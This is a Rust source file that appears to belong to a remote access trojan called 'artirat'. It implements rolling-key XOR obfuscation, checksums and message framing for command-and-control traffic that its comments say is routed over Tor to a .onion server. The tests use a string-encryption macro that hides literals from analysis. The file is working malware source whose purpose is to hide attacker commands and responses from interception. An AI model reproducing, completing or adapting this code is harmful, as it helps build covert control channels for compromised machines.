/// Lightweight traffic obfuscation layer (XOR with rolling key).
/// This is NOT a substitute for Tor — it adds defense-in-depth so
/// that C2 payloads appear as opaque blobs even if the Tor stream
/// is intercepted or the .onion address is compromised.

const KEY_STATIC: &[u8] = b"art1rat_c2_2026_xor";

#[inline]
fn rolling_key(seq: u64) -> u64 {
    seq.wrapping_mul(0x9E3779B97F4A7C15).rotate_left(13) ^ 0xDEADBEEFCAFEBABE
}

pub fn obfuscate(data: &[u8], seq: u64) -> Vec<u8> {
    let rk = rolling_key(seq);
    let mut out = Vec::with_capacity(data.len());
    for (i, &b) in data.iter().enumerate() {
        let k = KEY_STATIC[i % KEY_STATIC.len()]
            ^ ((rk >> ((i % 8) * 8)) as u8)
            ^ ((seq >> ((i % 4) * 8)) as u8);
        out.push(b ^ k);
    }
    out
}

pub fn deobfuscate(data: &[u8], seq: u64) -> Vec<u8> {
    obfuscate(data, seq)
}

/// Simple integrity check: returns a 32-bit checksum of the data
pub fn checksum(data: &[u8]) -> u32 {
    let mut h = 0u32;
    let mut i = 0;
    while i + 4 <= data.len() {
        h ^= u32::from_le_bytes([data[i], data[i+1], data[i+2], data[i+3]]);
        h = h.rotate_left(7);
        i += 4;
    }
    while i < data.len() {
        h ^= data[i] as u32;
        h = h.rotate_left(7);
        i += 1;
    }
    h
}

/// Obfuscate command line before sending to server (pairs with C2)
pub fn obfuscate_cmd(cmd: &str, seq: u64) -> Vec<u8> {
    let plain = cmd.as_bytes();
    let mut ob = obfuscate(plain, seq);
    let cksum = checksum(plain).to_le_bytes();
    let mut frame = Vec::with_capacity(ob.len() + 8);
    frame.extend_from_slice(&seq.to_le_bytes());
    frame.extend_from_slice(&cksum);
    frame.append(&mut ob);
    frame
}

/// Validate and deobfuscate a response from the server
pub fn deobfuscate_resp(data: &[u8]) -> Option<(u64, Vec<u8>)> {
    if data.len() < 12 {
        return None;
    }
    let seq = u64::from_le_bytes([data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]]);
    let cksum = u32::from_le_bytes([data[8], data[9], data[10], data[11]]);
    let payload = &data[12..];
    let dec = deobfuscate(payload, seq);
    if checksum(&dec) != cksum {
        return None;
    }
    Some((seq, dec))
}

#[cfg(test)]
mod tests {
    use super::*;
    use encstr::astr;

    #[test]
    fn roundtrip() {
        let msg = astr!("hello from artirat");
        let seq = 42;
        let ob = obfuscate(msg.as_bytes(), seq);
        let de = deobfuscate(&ob, seq);
        assert_eq!(msg.as_bytes(), &de);
    }

    #[test]
    fn checksum_stable() {
        let data = b"test data";
        assert_eq!(checksum(data), checksum(data));
    }

    #[test]
    fn frame_roundtrip() {
        let cmd = astr!("ls -la");
        let frame = obfuscate_cmd(cmd, 12345);
        let (seq, dec) = deobfuscate_resp(&frame).unwrap();
        assert_eq!(seq, 12345);
        assert_eq!(String::from_utf8(dec).unwrap(), cmd);
    }
}
